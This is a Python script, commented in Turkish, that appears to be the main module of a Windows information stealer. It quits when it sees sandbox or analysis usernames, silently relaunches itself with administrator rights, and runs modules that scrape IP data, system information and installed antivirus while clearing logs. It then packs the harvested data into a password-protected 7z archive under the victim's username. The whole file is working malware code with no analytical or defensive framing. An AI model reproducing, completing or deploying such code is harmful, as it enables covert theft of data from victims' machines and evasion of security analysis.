import threading
import time
import sys
import os
import ctypes
import getpass
import py7zr
import shutil
from datetime import datetime

# Scraper'ları import et
import utils.ipdata as ipdata
import utils.msinfo as msinfo
import utils.antivirus as antivirus

blacklistUsers = ['WDAGUtilityAccount', 'test', 'Guest', 'DefaultAccount']

username = getpass.getuser()

if username.lower() in blacklistUsers:
    os._exit(0)

antivirus_folders = [
    "C:\\Program Files",
    "C:\\Program Files (x86)",
    os.path.expandvars(r"C:\Users\%USERNAME%\AppData\Local"),
    os.path.expandvars(r"C:\Users\%USERNAME%\AppData\Roaming"),
]

def is_admin():
    """Yönetici yetkilerini kontrol et"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    """Scripti yönetici olarak yeniden çalıştır"""
    if not is_admin():
        try:
            script = os.path.abspath(sys.argv[0])
            params = ' '.join([script] + sys.argv[1:])
            
            ret = ctypes.windll.shell32.ShellExecuteW(
                None, 
                "runas", 
                sys.executable, 
                params, 
                None, 
                0  # SW_HIDE
            )
            
            if ret <= 32:  # Error codes
                raise Exception(f"ShellExecute failed with code {ret}")
                
            sys.exit(0)
        except Exception as e:
            print(f"Hata: Yönetici izinleri alınamadı - {e}")
            time.sleep(3)  # Hata mesajını görmek için bekle
            sys.exit(1)

def run_scraper(func):
    """Thread içinde scraper'ı çalıştır"""
    result = [None]
    
    def wrapper():
        result[0] = func()
    
    thread = threading.Thread(target=wrapper)
    thread.start()
    thread.join(timeout=300)  # 5 dakika timeout
    
    # Eğer hala çalışıyorsa bekle
    while thread.is_alive():
        time.sleep(1)
    
    return result[0]

def zip_temp_folder():
    """Temp klasöründeki lunix klasörünü şifreli olarak ziple ve orjinal klasörü sil"""
    global temp_path
    temp_path = os.path.expandvars(r"%temp%\lunix")
    if not os.path.exists(temp_path):
        return
        
    current_time = datetime.now().strftime('%H_%M_%S')
    zip_name = f"{username}_{current_time}.7z"
    zip_path = os.path.join(os.path.expandvars("%temp%"), zip_name)
    
    try:
        # 7z arşivi oluştur ve şifrele
        with py7zr.SevenZipFile(zip_path, 'w', password=zip_name) as archive:
            archive.writeall(temp_path, 'lunix')
        
    except Exception as e:
        print(f"Hata: Arşivleme işlemi başarısız - {e}")

def main():
    # Yönetici izinlerini kontrol et
    run_as_admin()
    
    # Yönetici izinleri alındı, scraper'ları çalıştır
    ipdata_result = run_scraper(ipdata.run_ipdata)
    msinfo_result = run_scraper(msinfo.run_msinfo_scraper)
    antivirus_result = run_scraper(antivirus.main(folders_to_scan=antivirus_folders, clear_logs=True, max_dirs_per_root=None))
    time.sleep(2)

    # Bütün işlemler bittikten sonra klasörü ziple
    zip_temp_folder()

if __name__ == "__main__":
    main()